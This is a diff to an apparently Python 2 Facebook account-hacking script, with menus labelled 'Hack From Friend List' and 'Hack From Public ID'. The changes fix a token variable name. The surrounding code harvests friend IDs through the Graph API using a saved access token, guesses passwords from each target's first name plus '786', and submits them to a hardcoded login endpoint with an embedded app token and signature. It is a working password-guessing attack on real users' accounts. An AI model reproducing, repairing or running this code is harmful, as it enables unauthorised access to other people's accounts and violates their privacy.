@@ -192,7 +192,7 @@ def pilih():
 
 def super():
   global token
-	os.system("clear")
+	os.system('clear')
 	try:
 		token=open(".logfuck.txt","r").read()
 	except IOError:
@@ -200,7 +200,7 @@ def super():
 		os.system("rm -rf .logfuck.txt")
 		time.sleep(1)
 		logmen()
-	os.system("clear")
+	os.system('clear')
     print
     print '\x1b[1;32;40m[type1] \x1b[1;33;41mHack From Friend List'
     print '\x1b[1;32;40m[type2] \x1b[1;33;42mHack From Public ID'
@@ -222,7 +222,7 @@ def pilih_super():
             os.system('clear')
             print
             jalan('\x1b[1;93m[\xe2\x9c\xba] Getting IDs \x1b[1;97m...')
-            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
             z = json.loads(r.text)
             for s in z['data']:
                 id.append(s['id'])
@@ -232,7 +232,7 @@ def pilih_super():
             print
             idt = raw_input('\x1b[1;96m[*] Enter ID : ')
             try:
-                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
                 op = json.loads(jok.text)
                 print '\x1b[1;31;40m[\xe2\x9c\xba] Name : ' + op['name']
             except KeyError:
@@ -241,7 +241,7 @@ def pilih_super():
                 super()
 
             print '\x1b[1;35;40m[\xe2\x9c\xba] Getting IDs...'
-            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
             z = json.loads(r.text)
             for i in z['data']:
                 id.append(i['id'])
@@ -288,7 +288,7 @@ def pilih_super():
             pass
 
         try:
-            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
+            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + token)
             b = json.loads(a.text)
             pass1 = b['first_name'] + '786'
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
@@ -396,7 +396,7 @@ def pilih_super():
 def brute():
     os.system('clear')
     try:
-        toket = open('logfuck.txt', 'r').read()
+        token = open('logfuck.txt', 'r').read()
     except IOError:
         print '\x1b[1;91m[!] Token not found'
         os.system('rm -rf logfuck.txt')
